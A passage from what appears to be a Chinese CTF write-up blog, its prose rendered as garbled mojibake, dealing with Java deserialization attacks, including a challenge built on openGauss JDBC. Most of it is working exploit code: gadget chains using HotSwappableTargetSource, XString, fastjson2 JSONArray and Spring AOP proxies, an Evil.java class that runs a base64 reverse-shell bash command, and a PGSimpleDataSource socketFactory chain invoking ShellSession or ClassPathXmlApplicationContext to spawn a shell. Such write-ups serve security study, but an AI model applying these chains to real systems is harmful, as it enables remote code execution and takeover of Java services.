class="hljs-string">&quot;jb&quot;</span>, templates);<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br><br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(jsonObject);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>));<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(s);<br>            System.out.println(URLEncoder.encode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())),<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            outputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Evil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151643797.png" alt="image-20240917151643797"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151501140.png" alt="image-20240917151501140"></p><h2 id="2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass"><a href="#2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass" class="headerlink" title="2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass"></a>2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass</h2><p>éå¸¸å¥½jdbcï¼Œä½¿æˆ‘çš„jdk17æ—‹è½¬ã€‚</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>UserControlleré€»è¾‘å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/user&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/info&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">ser</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String data)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data)));<br>            <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (admin)ois.readObject();<br>            <span class="hljs-keyword">return</span> user.getName();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var4;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€æ‰‹ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.opengauss<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>opengauss-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1-compatibility<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.oracle.coherence.ce<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>coherence-rest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>14.1.1-0-3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.37<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ€è·¯å‚ç…§æ¬§é˜³å­¦é•¿çš„ï¼š<a href="https://h4cking2thegate.github.io/posts/44597/">è®°ä¸€æ¬¡tabbyåˆ©ç”¨é“¾æŒ–æ˜ | H4cking to the Gate . (h4cking2thegate.github.io)</a></p><p>æœ¬é¢˜ä¾èµ–å­˜åœ¨ opengauss-jdbcï¼Œè™½ç„¶æ²¡è§è¿‡ï¼Œä½†æ˜¯å¯ä»¥ä»ä»£ç å’Œæ–‡æ¡£ä¸­çœ‹åˆ°ï¼Œæ˜¯ç”¨ postgre jdbc æ”¹çš„ï¼Œé‚£ä¹ˆç»å…¸çš„æ–¹æ³•å°±æ˜¯åˆ©ç”¨ socketFactory æ¥è§¦å‘ String å‚æ•°æ„é€ æ–¹æ³•</p><p>å¸¸è§çš„å‡ºç½‘åˆ©ç”¨æ–¹æ³•æ˜¯ <code>ClassPathXmlApplicationContext</code>ã€‚</p><p>é‚£ä¹ˆåˆ©ç”¨é“¾ä¸­é—´çš„éƒ¨åˆ†å¯ä»¥æš‚å®šä¸º jdbcï¼Œæ¥ä¸‹æ¥éœ€è¦è§¦å‘ getterï¼Œä»¥åŠå¯»æ‰¾ sinkã€‚</p><p>æˆ‘ä»¬å¯ä»¥å†™å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8000/exp.xml&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getDataSource</span><span class="hljs-params">(String className, String myargs)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactory&quot;</span>, className);<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactoryArg&quot;</span>, myargs);<br><br>    <span class="hljs-type">PGSimpleDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGSimpleDataSource</span>();<br>    setFieldValue(dataSource, <span class="hljs-string">&quot;properties&quot;</span>, properties);<br>    dataSource.setUser(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setPassword(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setServerName(<span class="hljs-string">&quot;localhost&quot;</span>);<br>    dataSource.setPortNumber(<span class="hljs-number">1234</span>);<br>    dataSource.setDatabaseName(<span class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-keyword">return</span> dataSource;<br>&#125;<br></code></pre></td></tr></table></figure><p>getDataSourceå³æ˜¯åˆ©ç”¨socketFactoryæ¥è®¾ç½®pgæ•°æ®åº“çš„ä¸€äº›å‚æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰getConnectæ“ä½œï¼Œæ‰€ä»¥åªæ˜¯ä¸€ä¸ªè®¾ç½®ï¼Œå¹¶ä¸éœ€è¦æœ¬åœ°èµ·ä¸€ä¸ªpgæ•°æ®åº“ã€‚</p><p>è‹¥æˆ‘ä»¬æƒ³åœ¨jdk17ä¸‹è§¦å‘toStringï¼Œå¯ä»¥ç”¨Jacksoné“¾çš„<code>EventListenerList</code>æˆ–è€… <code>Xstring</code>ï¼Œæˆ–è®¸ä¾èµ–ä¸­è¿˜å­˜åœ¨åˆ«çš„åˆ©ç”¨é“¾ã€‚</p><p>ä¸‹é¢ç”¨<code>XString</code>æ¥å®ç°ã€‚</p><p>å­¦é•¿å…¶å®è¿˜æŒ–æ˜åˆ°ä¸€ä¸ªå…¥å£ç±»ï¼Œtqlï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.tangosol.coherence.mvel2.sh.ShellSession#ShellSession (java.lang.String)<br></code></pre></td></tr></table></figure><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> cn.openGauss.WebApp.user.admin;<br><br><span class="hljs-comment">//import com.huawei.shade.com.alibaba.fastjson.JSONArray;</span><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> org.opengauss.ds.PGSimpleDataSource;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.PgTest.getDataSource;</span><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.Utils.*;</span><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenGaussTest</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">admin</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tangosol.coherence.mvel2.sh.ShellSession&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;).start()&quot;</span>;<br><br><span class="hljs-comment">//        String className = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="hljs-comment">//        String myargs = &quot;http://localhost:7788/exp.xml&quot;;</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br><span class="hljs-comment">//        ((DataSource)dataSource).getConnection();</span><br><span class="hljs-comment">//        Object proxy = getProxy(user, DataSource.class);</span><br><span class="hljs-comment">//        Object exp = getBadAttr(proxy);</span><br><span class="hljs-comment">//        Object exp = getXstringMap(user);</span><br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(dataSource, DataSource.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> base64Serialize(exp);<br>        base64Deserialize(b);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><span class="hljs-comment">//        CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="hljs-comment">//        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="hljs-comment">//        ctClass.removeMethod(writeReplace);</span><br><span class="hljs-comment">//        ctClass.toClass();</span><br><span class="hljs-comment">//        POJONode node = new POJONode(obj);</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        node.add(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBadAttr</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è‡ªè¡Œè¡¥å……é‚£å‡ 